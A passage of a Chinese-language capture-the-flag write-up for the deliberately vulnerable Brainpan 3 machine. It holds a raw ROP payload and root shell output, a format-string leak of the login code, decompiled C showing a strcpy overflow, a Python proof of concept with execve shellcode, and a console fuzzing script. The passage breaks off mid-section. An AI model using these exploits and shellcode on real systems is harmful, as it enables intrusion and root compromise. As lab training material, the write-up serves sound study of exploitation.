&#x27;\x73\x73\x73\x73\x7c\x90\x87\x04\x08\x9d\x85\x04\x08\x48\xad\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x91\x82\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xfb\x8a\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x2f\x85\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xb5\x8c\xdd\x06\xeb\x8f\x04\x08\x86\x87\x04\x08\xef\x8e\x04\x08\x61\x61\x61\x61\x62\x61\x61\x61\x63\x61\x61\x61\x64\x61\x61\x61\x65\x61\x61\x61\x66\x61\x61\x61\x67\x61\x61\x61\x68\x61\x61\x61\x69\x61\x61\x61\x6a\x61\x61\x61\x6b\x61\x61\x61\x6c\x61\x61\x61\x6d\x61\x61\x61\x6e\x61\x61\x61\x6f\x61\x61\x61\x70\x61\x61\x61\x71\x61\x61\x61\x72\x61\x61\x61\x73\x61\x61\x61\x74\x61\x61\x61\x75\x61\x61\x61\x76\x61\x61\x61\x77\x61\x61\x61\x78\x61\x61\x61\x79\x61\x61\x61\x7a\x61\x61\x62\x62\x61\x61\x62\x63\x61\x61\x62\x64\x61\x61\x62\x65\x61\x61\x62\x66\x61\x61\x62\x67\x61\x61\x62\x68\x61\x61\x62\x69\x61\x61\x62\x6a\x61\x61\x62\x5c\xb0\x04\x08\x0a\xdc\x8d\x04\x08\x7c\x90\x87\x04\x08\x9d\x85\x04\x08\x48\xad\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x91\x82\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xfb\x8a\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x2f\x85\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xb5\x8c\xdd\x06\xeb\x8f\x04\x08\x86\x87\x04\x08\xef\x8e\x04\x08\x0a&#x27;&quot;</span> &gt;&gt; /opt/.messenger/pwn.msg</span><br><span class="line">[*] Wait <span class="keyword">for</span> your r00t shellz</span><br><span class="line">[*] Bingo!</span><br><span class="line">[*] uid=1001(puck) gid=1004(dev) euid=0(root) groups=0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">(root)</span><br><span class="line">$ </span><br><span class="line">root</span><br><span class="line">gzip: brainpan.8.gz: No such file or directory</span><br><span class="line">.TH man 8 <span class="string">&quot;20 May 2015&quot;</span> <span class="string">&quot;3.0&quot;</span> <span class="string">&quot;brainpan 3&quot;</span></span><br><span class="line"></span><br><span class="line">.SH DESCRIPTION</span><br><span class="line">Congratulations, you win! Thanks <span class="keyword">for</span> playing!</span><br><span class="line"></span><br><span class="line">.SH FLAG</span><br><span class="line">.B</span><br><span class="line">flag&#123;tricksy-hobbitses-use-unix&#125;</span><br><span class="line"></span><br><span class="line">.SH BUGS</span><br><span class="line">You found them all. </span><br><span class="line"></span><br><span class="line">.SH AUTHOR</span><br><span class="line">superkojiman - </span><br><span class="line">.B</span><br><span class="line">http://blog.techorganic.com</span><br><span class="line"></span><br><span class="line">.SH TESTERS</span><br><span class="line">Special thanks go to barrebas and Swappage taking the time to <span class="built_in">test</span> Brainpan 3!</span><br><span class="line">.br</span><br><span class="line">barrebas - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/barrebas</span><br><span class="line">.br</span><br><span class="line">Swappage - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/Swappage</span><br><span class="line">$ id</span><br><span class="line">uid=1001(puck) gid=1004(dev) euid=0(root) groups=0(root)</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub209.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub210.jpg"></p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>虚拟机完全启动后，使用nmap进行端口扫描。这显示了1个开放端口1337和一个封闭（防火墙）端口8080，一旦连接到端口1337，将看到Brainpan Console的登录屏幕。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.117 1337</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|</span><br><span class="line">  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | </span><br><span class="line">  |   |  __ &lt;    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | </span><br><span class="line"> ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|</span><br><span class="line"></span><br><span class="line">                                                            by superkojiman</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br><span class="line"></span><br><span class="line">ACCESS CODE:</span><br></pre></td></tr></table></figure>

<p>根据屏幕上的文字，必须处理一个4位数的代码，并且在3次失败的尝试之后，都会创建一个新的代码，因此很难对其进行暴力破解。想到的第一件事是它可能是格式字符串漏洞，并且经过快速测试表明确实如此。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: %p%p%p</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: 0xbff1279c(nil)0x751</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 1</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>当使用格式字符串模式作为小数时，可以在位置3的输出中发现登录代码1873</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: %d-%d-%d-%d-%d-%d-%d</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: -1074714724-0-1873--1074714724-0-10--367016960</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 2</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>可以将格式字符串模式缩短为％3$d，以直接获取当前的登录代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: %3<span class="variable">$d</span></span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: 1873</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 3</span><br><span class="line"></span><br><span class="line">BRUTE-FORCE ATTEMPT DETECTED</span><br><span class="line">PLEASE USE THE NEW CODE DISPLAYED ON YOUR ACCESS TOKEN</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>使用代码登录到Brainpan控制台，显示一个菜单，展示一些选项，并设置了权限，例如AUTH，REPORT和MENU</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: ID-4057</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND:</span><br></pre></td></tr></table></figure>

<p>最有趣的选项是1,2和3.。4显然是一个巨魔。<br>控制台使用选项1告诉我们该构建已禁用报告功能<br>选项2告诉我们该存储库现已可用<br>选项3允许我们更改会话名称。<br>看来此选项具有格式字符串和缓冲区溢出漏洞。<br>存储库选项使我想起8080处于关闭状态的端口，快速重新扫描显示该端口现已打开，当我们浏览至该端口时，我们会看到一个简单的网页。<br>我启动了一个目录bruteforce，它显示了名为“repo”的文件夹，其中包含5个文件。</p>
<p>输入2，然后再扫描8080端口，显示已经开启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: 2</span><br><span class="line">SELECTED: 2</span><br><span class="line"></span><br><span class="line">CODE REPOSITORY IS NOW AVAILABLE</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -p 8080 -v -sV 192.168.56.117 -r</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8080/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)</span><br><span class="line">MAC Address: 08:00:27:90:21:26 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub201.jpg"></p>
<p>名为report的文件引起了我的注意，因为在Brainpan控制台中也有此report选项。我下载了文件并开始对其进行分析。</p>
<h3 id="分析report"><a href="#分析report" class="headerlink" title="分析report"></a>分析report</h3><p>提供所需的参数（报告数据和1或0）时，会得到一个很大的查理·布朗横幅，我不认识这个人，但我敢打赌，他是个好人。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># ./report aa 0</span></span><br><span class="line">               ____</span><br><span class="line">           .-<span class="string">&#x27;&amp;    &#x27;</span>-.</span><br><span class="line">          / __    __  \</span><br><span class="line">         :-(__)--(__)--;</span><br><span class="line">        (      (_       )</span><br><span class="line">         :             ;</span><br><span class="line">          \    __     /</span><br><span class="line">           `-._____.-<span class="string">&#x27;</span></span><br><span class="line"><span class="string">             /`&quot;&quot;&quot;`\</span></span><br><span class="line"><span class="string">            /    ,  \</span></span><br><span class="line"><span class="string">           /|/\/\/\ _\</span></span><br><span class="line"><span class="string">          (_|/\/\/\\__)</span></span><br><span class="line"><span class="string">            |_______|</span></span><br><span class="line"><span class="string">           __)_ |_ (__</span></span><br><span class="line"><span class="string">          (_____|_____)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       YOU&#x27;</span>RE IN THE MATRIX</span><br><span class="line">           CHARLIE BROWN</span><br></pre></td></tr></table></figure>

<p>是时候对可执行文件使用ida进行逆向工程以查看发生了什么。</p>
<ul>
<li>main</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v4; // ST14_4</span><br><span class="line">  char dest; // [esp+18h] [ebp-68h]</span><br><span class="line">  unsigned int v6; // [esp+7Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(0x14u);</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    cb();</span><br><span class="line">    strcpy(&amp;dest, argv[1]);</span><br><span class="line">    v4 = atoi(argv[2]);</span><br><span class="line">    P = (int)REPORT;</span><br><span class="line">    N = (void *)(-sysconf(30) &amp; (unsigned int)REPORT);</span><br><span class="line">    mprotect(N, 0x1F4u, 7);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      sanitize(&amp;dest);</span><br><span class="line">      encrypt(&amp;dest);</span><br><span class="line">      record_data(&amp;dest);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      record_data(&amp;dest);</span><br><span class="line">      record_id(&amp;dest);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] RECORDED [%s]\n&quot;</span>, &amp;dest);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s &lt;report&gt; [0|1]\n&quot;</span>, *argv);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>sanitize</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl sanitize(char *s)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+18h] [ebp-10h]</span><br><span class="line">  int v3; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = 0;</span><br><span class="line">  <span class="keyword">for</span> ( i = 0; i &lt; strlen(s); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !isalpha(s[i]) )</span><br><span class="line">    &#123;</span><br><span class="line">      s[i] = 63;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>encrypt</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">size_t __cdecl encrypt(char *s)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // eax</span><br><span class="line">  size_t result; // eax</span><br><span class="line">  unsigned int i; // [esp+18h] [ebp-10h]</span><br><span class="line">  int v4; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v1 = time(0);</span><br><span class="line">  srand(v1);</span><br><span class="line">  v4 = rand() % 9000 + 1000;</span><br><span class="line">  <span class="keyword">for</span> ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = strlen(s);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">      <span class="built_in">break</span>;</span><br><span class="line">    s[i] ^= v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>record_data</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl record_data(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char *v1; // eax</span><br><span class="line">  time_t timer; // [esp+2Ch] [ebp-5Ch]</span><br><span class="line">  FILE *stream; // [esp+30h] [ebp-58h]</span><br><span class="line">  struct tm *tp; // [esp+34h] [ebp-54h]</span><br><span class="line">  char s; // [esp+3Ah] [ebp-4Eh]</span><br><span class="line">  char dest[4]; // [esp+54h] [ebp-34h]</span><br><span class="line">  int v8; // [esp+58h] [ebp-30h]</span><br><span class="line">  int v9; // [esp+5Ch] [ebp-2Ch]</span><br><span class="line">  int v10; // [esp+60h] [ebp-28h]</span><br><span class="line">  int v11; // [esp+64h] [ebp-24h]</span><br><span class="line">  __int16 v12; // [esp+68h] [ebp-20h]</span><br><span class="line">  unsigned int v13; // [esp+7Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v13 = __readgsdword(0x14u);</span><br><span class="line">  stream = 0;</span><br><span class="line">  time(&amp;timer);</span><br><span class="line">  tp = localtime(&amp;timer);</span><br><span class="line">  strftime(&amp;s, 0x1Au, <span class="string">&quot;%Y%m%d%H%M%S&quot;</span>, tp);</span><br><span class="line">  memset(dest, 0, 0x28u);</span><br><span class="line">  *(_DWORD *)dest = 1836017711;</span><br><span class="line">  v8 = 1851862885;</span><br><span class="line">  v9 = 1769172577;</span><br><span class="line">  v10 = 1346720303;</span><br><span class="line">  v11 = 1398035023;</span><br><span class="line">  v12 = 47;</span><br><span class="line">  strcat(dest, &amp;s);</span><br><span class="line">  v1 = &amp;dest[strlen(dest)];</span><br><span class="line">  *(_DWORD *)v1 = 1885696558;</span><br><span class="line">  v1[4] = 0;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] WRITING REPORT TO %s\n&quot;</span>, dest);</span><br><span class="line">  stream = fopen(dest, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  fputs(a1, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  strncpy(REPORT, a1, 0x64u);</span><br><span class="line">  <span class="built_in">return</span> feedback();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>record_id</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl record_id(char *src)</span><br><span class="line">&#123;</span><br><span class="line">  char dest; // [esp+19h] [ebp-Fh]</span><br><span class="line">  int (*v3)(); // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = feedback;</span><br><span class="line">  strcpy(&amp;dest, src);</span><br><span class="line">  v3();</span><br><span class="line">  <span class="built_in">return</span> atoi(&amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>feedback</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int feedback()</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">&quot;[+] DATA SUCCESSFULLY ENCRYPTED&quot;</span>);</span><br><span class="line">  <span class="built_in">return</span> puts(<span class="string">&quot;[+] DATA SUCCESSFULLY RECORDED&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，代码首先检查本地主机名是否为brainpain3，并假设本地主机名是brainpain3，它将report数据复制到&amp;dest，并使用mprotect使REPORT数据可执行。之后，它检查第二个参数。</p>
<ul>
<li>1:将使用sanitize函数过滤&amp;dest中的数据，然后对其进行加密，最后使用record_data函数进行存储，该函数将数据存储到文件中，并将前100个字节复制到REPORT中。</li>
<li>2:数据将直接存储而无需任何过滤或加密，并且将调用附加函数record_id，现在这是一个有趣的函数。</li>
</ul>
<p>当查看record_id函数时，可以看到它为pfeedback分配了一个函数指针，然后将&amp;dest的内容复制到dest中，由于dest最多只能容纳3个字节，因此我们可以溢出它并控制pfeedback指针，该指针将在之后执行strcpy导致代码执行。</p>
<p>在kali中使用gdb调试如下所示</p>
<p><img src="https://r3v3rs3r.files.wordpress.com/2015/09/poc1.png"></p>
<p>因此，总结一下：因为前100个字节存储在可执行位置（REPORT），并且可以控制函数指针（pfeedback），所以可以在REPORT中存储一些shellcode，然后使pfeedback指针指向我的shellcode。可以在IDA中查找REPORT的地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.bss:0804B0A0                 public REPORT</span><br><span class="line">.bss:0804B0A0 ; char REPORT[500]</span><br><span class="line">.bss:0804B0A0 REPORT          db 1F4h dup(?)          ; DATA XREF: record_data+131↑o</span><br><span class="line">.bss:0804B0A0                                         ; main+7D↑o</span><br><span class="line">.bss:0804B0A0 _bss            ends</span><br><span class="line">.bss:0804B0A0</span><br></pre></td></tr></table></figure>
<p>漏洞利用缓冲区可能类似于：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AAA&lt;REPORT_address+7&gt;&lt;shellcode&gt;</span><br></pre></td></tr></table></figure>

<p>请注意，必须在REPORT地址上添加7，以越过3个A和4个字节的函数指针。</p>
<ul>
<li>python版POC代码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">__REPORT = 0x0804B0A0</span><br><span class="line"> </span><br><span class="line">def p(v):</span><br><span class="line">    <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line"> </span><br><span class="line">payload  = <span class="string">&#x27;AAA&#x27;</span></span><br><span class="line">payload += p(__REPORT + 7)</span><br><span class="line">payload += shellcode</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> payload + <span class="string">&#x27; 0&#x27;</span></span><br></pre></td></tr></table></figure>

<p>执行poc会按预期生成一个shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment">#./report $(./poc.py)</span></span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20150912020038.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">$ id</span><br><span class="line">uid=1000(root) gid=1001(root) groups=1001(root),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),105(scanner),108(bluetooth),112(netdev),125(powerdev)</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h3 id="brainpan-console-report功能"><a href="#brainpan-console-report功能" class="headerlink" title="brainpan console - report功能"></a>brainpan console - report功能</h3><p>现在，如果还记得，由于禁用了report功能，目前无法在brainpan控制台中创建report，因此必须启用它，现在这就是“update session name”选项（3）中缓冲区溢出起作用的地方。通过溢出session name缓冲区，可以控制以下值：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AUTH   [Y]    REPORT [N]    MENU   [Y]</span><br></pre></td></tr></table></figure>

<p>通过将REPORT [N]设置为Y，将启用REPORT功能。一个模糊测试脚本可以帮助找到正确的长度，直到覆盖N</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from select import select</span><br><span class="line">from socket import *</span><br><span class="line">from time import sleep</span><br><span class="line">import telnetlib</span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import re</span><br><span class="line"> </span><br><span class="line">class NetcatClient:</span><br><span class="line">    def __init__(self, host, port):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Netcat Class init.</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = int(port)</span><br><span class="line">        self.delay = 0.05</span><br><span class="line">        self.linemode = False</span><br><span class="line">        self.sock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># private functions</span></span><br><span class="line">    def __check_state(self, timeout=0):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Check the socket it&#x27;s read, write and exception state </span></span><br><span class="line"><span class="string">        using select</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="comment"># we need abit of a delay to keep things</span></span><br><span class="line">        <span class="comment"># running smooth</span></span><br><span class="line">        sleep(self.delay)</span><br><span class="line">        <span class="built_in">return</span> select([self.sock], [self.sock], [self.sock], timeout)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># core functions</span></span><br><span class="line">    def connect(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Connect to host</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            self.sock.connect((self.host, self.port))</span><br><span class="line">            <span class="built_in">return</span> True</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line">            <span class="built_in">return</span> False</span><br><span class="line"> </span><br><span class="line">    def close(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Close the connection</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            self.sock.close()</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def recv(self, size=4096):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Recieve all data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="keyword">if</span> readable:</span><br><span class="line">                <span class="comment"># while socket readable...</span></span><br><span class="line">                <span class="keyword">while</span> readable:</span><br><span class="line">                    <span class="comment"># collect all data</span></span><br><span class="line">                    data += self.sock.recv(size)</span><br><span class="line">                    <span class="comment"># re-check socket&#x27;s state</span></span><br><span class="line">                    readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="built_in">return</span> data</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def send(self, data):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Send data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.linemode:</span><br><span class="line">            data += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        try:</span><br><span class="line">            readable, writable, exceptional = self.__check_state()</span><br><span class="line">            <span class="keyword">if</span> writable:</span><br><span class="line">                self.sock.send(data)</span><br><span class="line">        except error as e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;NetcatClassError:&#x27;</span>, e</span><br><span class="line"> </span><br><span class="line">    def sendrecv(self, data):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Send and recieve data</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        self.send( data )</span><br><span class="line">        <span class="built_in">return</span> self.recv()</span><br><span class="line"> </span><br><span class="line">    def interact(self):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">        Interactive telnet client</span></span><br><span class="line"><span class="string">        &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        try:</span><br><span class="line">            t = telnetlib.Telnet()</span><br><span class="line">            t.sock = self.sock</span><br><span class="line">            t.interact()</span><br><span class="line">            t.close()</span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            self.close()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># fuzzing code</span></span><br><span class="line">    s = NetcatClient(<span class="string">&#x27;192.168.56.117&#x27;</span>, <span class="string">&#x27;1337&#x27;</span>)</span><br><span class="line">    s.linemode = True</span><br><span class="line">    s.connect()</span><br><span class="line">    <span class="comment"># banner</span></span><br><span class="line">    s.recv()</span><br><span class="line">    <span class="comment"># send format string pattern and grab the login code</span></span><br><span class="line">    r = s.sendrecv(<span class="string">&#x27;%3$d&#x27;</span>)</span><br><span class="line">    <span class="comment"># parse the login code from the reponse</span></span><br><span class="line">    l = re.findall(r<span class="string">&quot;INVALID ACCESS CODE: (.*?)\n&quot;</span>, r)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;login code -&gt; &#x27;</span>, l</span><br><span class="line">    <span class="comment"># send login code and log in</span></span><br><span class="line">    s.sendrecv(<span class="string">&#x27;%s&#x27;</span>%(l[0]))</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># send change sessionname commands</span></span><br><span class="line">    <span class="comment"># with length of 0 ... 255</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(256):</span><br><span class="line">        s.sendrecv(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">        resp = s.sendrecv(i * <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">        l = re.findall(r<span class="string">&quot;REPORT \[(.*?)\]&quot;</span>, resp)</span><br><span class="line">        <span class="built_in">print</span> i,<span class="string">&#x27;-&gt;&#x27;</span>,l</span><br><span class="line">        <span class="comment"># if value changed to Y break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Y&#x27;</span> <span class="keyword">in</span> l[0]:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;payload -&gt; %d * Y&#x27;</span> % (i)</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"> </span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>

<p>运行模糊测试器会导致：</p>
